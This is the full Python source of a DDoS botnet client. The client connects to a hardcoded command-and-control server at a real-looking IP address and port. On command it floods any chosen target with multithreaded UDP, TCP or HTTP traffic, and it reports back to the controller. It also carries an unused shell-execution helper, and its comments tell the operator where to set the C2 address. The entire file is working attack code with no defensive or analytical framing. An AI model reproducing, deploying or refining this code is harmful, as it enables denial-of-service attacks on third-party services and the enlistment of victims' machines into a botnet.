import socket, subprocess, time, threading, multiprocessing, requests, os


# This is used for executing the different methods or commands
def execute_command(command):
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except subprocess.CalledProcessError as e:
        output = e.output
    return output

# This is the UDP attack method.
def send_udp_packet(ip, port, message):
    try:
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_socket.sendto(message.encode("utf-8"), (ip, port))
        udp_socket.close()
    except Exception as e:
        print(f"UDP Attack failed: {e}")

def send_udp_attack_process(ip, port, start_time, duration):
    while time.time() - start_time < duration:
        message = str(time.time() - start_time)
        send_udp_packet(ip, port, message)

def send_udp_attack(ip, port, duration):
    start_time = time.time()

    threads = []

    # Start 20 threads for sending UDP requests, this is modifiable
    for _ in range(20):
        thread = threading.Thread(target=send_udp_attack_process, args=(ip, port, start_time, duration))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

# TCP attack method
def send_tcp_packet(ip, port):
    try:
        attack_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        attack_socket.connect((ip, port))
        attack_socket.close()
    except Exception as e:
        print(f"TCP Attack failed: {e}")

def send_tcp_attack_process(ip, port, end_time):
    while time.time() < end_time:
        send_tcp_packet(ip, port)

def send_tcp_attack(ip, port, duration):
    end_time = time.time() + duration

    threads = []

    # Start 20 threads for sending TCP requests, this is modifiable
    for _ in range(20):
        thread = threading.Thread(target=send_tcp_attack_process, args=(ip, port, end_time))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()


# HTTP attack method
def send_http_request(url, end_time):
    while time.time() < end_time:
        try:
            requests.get(url)
        except Exception as e:
            print(f"HTTP attack failed: {e}")


def send_http_attack(url, duration):
    end_time = time.time() + duration
    threads = []

    # Start 20 threads for sending HTTP requests, this is modifiable
    for _ in range(20):
        thread = threading.Thread(target=send_http_request, args=(url, end_time))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

# used for maintaining C2 connection
def connect_to_server(server_ip, server_port):
    client_socket = None
    while client_socket is None:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((server_ip, server_port))
        except Exception as e:
            print(f"Connection failed: {e}")
            time.sleep(10)
    return client_socket

# Connects to C2 server
def main():
    server_ip = "91.199.154.151" # Change C2 IP Address here
    server_port = 4242 # This is where you put the C2 (Command & Control server) port here

    while True:
        client_socket = connect_to_server(server_ip, server_port)
        try:
            command = client_socket.recv(1024).decode("utf-8").strip()
            if command.lower() == "terminate":
                client_socket.close()
                os._exit(0)

            if command.lower().startswith("udp"):
                _, ip, port, duration = command.split(" ", 3)
                send_udp_attack(ip, int(port), float(duration))
                client_socket.sendall(b"\nUDP attack finished!")
                continue

            if command.lower().startswith("tcp"):
                _, ip, port, duration = command.split(" ", 3)
                send_tcp_attack(ip, int(port), float(duration))
                client_socket.sendall(b"\nTCP attack finished!")
                continue

            if command.lower().startswith("http"):
                _, url, duration = command.split(" ", 2)
                send_http_attack(url, float(duration))
                client_socket.sendall(b"\nHTTP attack finished!")
                continue

        except Exception as e:
            print(f"Connection lost: {e}")
            client_socket.close()
            time.sleep(10)
            client_socket = connect_to_server(server_ip, server_port)
    
    client_socket.close()

if __name__ == "__main__":
    main()
